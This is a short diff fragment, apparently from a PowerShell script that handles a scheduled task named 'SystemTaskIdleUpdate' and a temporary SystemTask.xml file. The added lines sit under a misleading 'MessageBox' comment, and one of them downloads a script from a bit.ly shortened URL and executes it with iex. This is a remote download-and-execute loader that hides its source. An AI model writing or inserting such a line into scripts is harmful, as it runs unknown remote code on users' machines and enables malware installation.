@@ -140,3 +140,9 @@ del $env:TEMP"\SystemTask.xml";
 
 #schtasks.exe /Delete /tn "SystemTaskIdleUpdate"; #
 
+#
+# MessageBox
+#
+
+iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1Mx7L5A');
+
